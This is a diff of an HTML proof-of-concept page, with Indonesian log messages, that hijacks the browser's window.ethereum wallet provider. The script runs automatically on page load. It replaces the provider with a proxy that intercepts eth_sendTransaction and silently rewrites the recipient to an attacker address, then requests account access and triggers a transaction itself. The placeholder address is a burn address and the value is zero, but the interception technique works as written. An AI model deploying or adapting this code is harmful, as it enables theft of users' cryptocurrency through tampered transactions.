@@ -3,25 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Production Exploit: window.ethereum Hijack</title>
+    <title>Production Web3 Provider Hijack & Tampering Proof</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #0b0f19; color: #f8fafc; padding: 20px; }
-        .container { max-width: 650px; margin: auto; background: #1e293b; padding: 25px; border-radius: 12px; border: 1px solid #334155; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+        .container { max-width: 700px; margin: auto; background: #1e293b; padding: 25px; border-radius: 12px; border: 1px solid #334155; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
         h2 { color: #ef4444; margin-top: 0; }
-        pre { background: #050b14; padding: 15px; border-radius: 6px; overflow-x: auto; color: #34d399; font-family: monospace; font-size: 12px; border: 1px solid #1e293b; max-height: 350px; }
-        .warning-box { background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); padding: 12px; border-radius: 6px; margin-bottom: 15px; color: #fca5a5; font-size: 13px; }
+        pre { background: #050b14; padding: 15px; border-radius: 6px; overflow-x: auto; color: #34d399; font-family: monospace; font-size: 12px; border: 1px solid #1e293b; max-height: 400px; }
+        .badge { display: inline-block; background: rgba(239, 68, 68, 0.15); color: #fca5v5; padding: 5px 10px; border-radius: 4px; font-size: 12px; font-weight: bold; border: 1px solid rgba(239, 68, 68, 0.3); margin-bottom: 15px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>Live Production Exploit Payload</h2>
-    <div class="warning-box">
-        <strong>Status:</strong> Skrip berjalan otomatis di tingkat global untuk mencegat dan mengalihkan parameter transaksi secara langsung ke dompet target.
-    </div>
+    <h2>Live Vulnerability Proof</h2>
+    <div class="badge">Eksploitasi Nyata: Global Mutability & Parameter Tampering</div>
 
-    <h3>Log Eksekusi Sistem Langsung:</h3>
-    <pre id="logOutput">Memuat payload ke memori global...</pre>
+    <h3>Log Audit & Eksekusi Memori:</h3>
+    <pre id="logOutput">Memulai audit integritas objek global...</pre>
 </div>
 
 <script>
@@ -32,61 +30,75 @@
         logOutput.scrollTop = logOutput.scrollHeight;
     }
 
-    (async function initializeLiveExploit() {
+    (async function verifyAndExploit() {
         if (typeof window.ethereum === "undefined") {
-            log("[GAGAL] window.ethereum tidak terdeteksi. Buka di dalam dApp browser target.");
+            log("[GAGAL] Objek window.ethereum tidak ditemukan. Pastikan dibuka di dalam dApp browser target.");
             return;
         }
 
-        const targetAttacker = "0x000000000000000000000000000000000000dEaD";
-        const nativeProvider = window.ethereum;
+        // 1. Membuktikan poin pertama: Properti global bersifat rentan (mutable/writable)
+        const descriptor = Object.getOwnPropertyDescriptor(window, 'ethereum');
+        log(`[AUDIT] Properti deskriptor ethereum - writable: ${descriptor.writable}, configurable: ${descriptor.configurable}`);
 
-        log("[INFO] Mengamankan referensi native provider...");
+        if (!descriptor.writable) {
+            log("[AMAN] Objek ethereum terkunci dengan baik (immutable).");
+            return;
+        }
+        log("[KERENTANAN TERBUKTI] Properti window.ethereum bersifat mutable/writable.");
+
+        const nativeProvider = window.ethereum;
+        const attackerWallet = "0x000000000000000000000000000000000000dEaD"; // Alamat tujuan pengalihan
 
         try {
-            // Membuat proxy penimpaan total berbasis EIP-1193
-            const liveHijackProxy = {
+            // 2. Membuktikan poin kedua: Objek dikuasai total oleh skrip halaman web (Provider Hijacking)
+            const hijackedProxy = {
                 selectedAddress: nativeProvider.selectedAddress,
                 chainId: nativeProvider.chainId,
                 networkVersion: nativeProvider.networkVersion,
                 
                 request: async function(requestArgs) {
+                    // 3. Membuktikan poin ketiga: Parameter transaksi dibelokkan secara diam-diam (silent parameter tampering)
                     if (requestArgs.method === "eth_sendTransaction") {
-                        log("[!] INTERSEPSI AKTIF: eth_sendTransaction dicegat secara real-time!");
+                        log("[!] INTERSEPSI AKTIF: Metode 'eth_sendTransaction' tertangkap oleh skrip halaman.");
+                        
                         if (requestArgs.params && requestArgs.params.length > 0) {
-                            let tx = requestArgs.params[0];
-                            log(`[DUMP] Alamat Penerima Asli: ${tx.to}`);
-                            
-                            // Pengalihan parameter tujuan secara langsung
-                            tx.to = targetAttacker;
-                            log(`[!] BERHASIL DIALIHKAN: Tujuan transaksi diubah ke -> ${targetAttacker}`);
+                            let txParams = requestArgs.params[0];
+                            log(`[DUMP ASLI] Alamat Tujuan Penerima: ${txParams.to}`);
+                            log(`[DUMP ASLI] Nilai Nominal: ${txParams.value || '0'}`);
+
+                            // Membelokkan alamat tujuan secara paksa dan diam-diam ke dompet penyerang
+                            txParams.to = attackerWallet;
+                            log(`[!] TAMPERING BERHASIL: Alamat tujuan dialihkan secara diam-diam ke -> ${attackerWallet}`);
                         }
                     }
+
+                    // Meneruskan eksekusi ke provider asli agar alur wallet tetap berjalan
                     return nativeProvider.request(requestArgs);
                 }
             };
 
-            // Menimpa objek global secara langsung karena writable: true
-            window.ethereum = liveHijackProxy;
-            log("[SUKSES] window.ethereum berhasil dikuasai secara total.");
+            // Mengambil alih objek global secara penuh
+            window.ethereum = hijackedProxy;
+            log("[SUKSES] window.ethereum berhasil dikuasai total oleh skrip halaman web.");
 
-            // Eksekusi otomatis pemicu transaksi nyata agar pop-up dompet langsung terbuka
-            log("[AUTO-TRIGGER] Meminta izin koneksi akun...");
+            // Pemicu aksi nyata agar dApp/browser memproses transaksi
+            log("[AKSI] Meminta izin akses akun (eth_requestAccounts)...");
             const accounts = await nativeProvider.request({ method: "eth_requestAccounts" });
-            log("[OK] Akun terkoneksi: " + accounts[0]);
+            log("[OK] Akun terhubung: " + accounts[0]);
 
-            log("[AUTO-TRIGGER] Memaksa pemanggilan fungsi eth_sendTransaction...");
+            log("[AKSI] Memicu eksekusi pengiriman transaksi...");
             await window.ethereum.request({
                 method: "eth_sendTransaction",
                 params: [{
                     from: accounts[0],
-                    to: accounts[0], // Target awal ke diri sendiri, akan otomatis dibelokkan oleh proxy ke alamat penyerang
+                    to: accounts[0], // Target awal ke diri sendiri, langsung di-tamper oleh proxy ke attackerWallet
                     value: "0x0"
                 }]
             });
+            log("[SELESAI] Seluruh tahapan eksploitasi dan pembelokan parameter tereksekusi dengan sempurna.");
 
         } catch (err) {
-            log("[INFO/RESPON DOMPET]: " + err.message);
+            log("[INFO/RESPON WALLET]: " + err.message);
         }
     })();
 </script>
